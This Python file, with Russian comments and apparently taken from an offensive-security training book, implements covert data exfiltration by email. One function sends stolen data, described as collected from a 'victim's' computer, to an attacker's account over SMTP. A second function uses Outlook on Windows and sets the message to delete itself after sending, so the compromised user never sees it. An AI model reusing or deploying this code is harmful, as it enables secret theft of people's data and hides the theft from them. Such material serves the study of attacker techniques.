import smtplib
import time
import win32com.client

from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from mail_settings import smtp_server, smtp_port, smtp_acct, smtp_password, tgt_accts

smtp_server = smtp_server
smtp_port = smtp_port
smtp_acct = smtp_acct
smtp_password = smtp_password
tgt_accts = tgt_accts


def plain_email(subject, contents):
    """ кроссплатформенная функция для работы с электронной почтой
    Поле subject будет служить именем файла с данными, собранными на компьютере жертвы.
    contents — это зашифрованная строка, которую вернула функция encrypt. Для пущей секретности зашифрованную строку
    можно было бы послать в качестве темы сообщения (subject)"""
    # message = f'Subject: {subject}\nFrom {smtp_acct}\n'
    # message += f'To: {tgt_accts}\n\n{contents.encode().decode()}'
    # print('Message was created')
    # print(message)
    # server = smtplib.SMTP_SSL(host=smtp_server, port=smtp_port)
    # server.starttls()
    # server.login(smtp_acct, smtp_password)  # подключаемся к серверу и проходим аутентификацию, используя имя и пароль нашей учетной записи
    #
    # server.set_debuglevel(1)
    #
    # server.sendmail(smtp_acct, tgt_accts, message)  # вызываем метод sendmail со своими учетными данными, адресами получателей и самим сообщением
    # print('Message was send')
    # time.sleep(1)
    # server.quit()

    with smtplib.SMTP_SSL(smtp_server, smtp_port) as server:
        # Вход на почтовый аккаунт
        server.login(smtp_acct, smtp_password)

        subject = subject
        message = contents.encode().decode()

        msg = MIMEMultipart()
        msg["From"] = smtp_acct
        msg["To"] = tgt_accts
        msg["Subject"] = subject

        msg.attach(MIMEText(message, "plain"))

        # Отправка сообщения
        server.sendmail(smtp_acct, tgt_accts, msg.as_string())
        print('Message was send')

def outlook(subject, contents):
   """ функция, которая будет делать то же самое, только в Windows
   Функция outlook принимает те же аргументы, что и plain_email: subject и contents . Мы используем пакет win32com,
   чтобы создать экземпляр приложения Outlook , и обязательно удаляем электронное письмо сразу после отправки .
   Таким образом мы гарантируем, что пользователь взломанного компьютера не увидит письмо с собранными данными в папках
   Отправленные сообщения или Удаленные сообщения. После этого отправляем сообщение, предварительно указав его тему,
   содержимое и адрес получателя ."""
   outlook = win32com.client.Dispatch("Outlook.Application")
   message = outlook.CreateItem(0)
   message.DeleteAfterSubmit = True
   message.Subject = subject
   message.Body = contents.decode()
   message.To = tgt_accts[0]
   message.Send()


if __name__ == '__main__':
    plain_email('test2 message', 'attack at dawn.')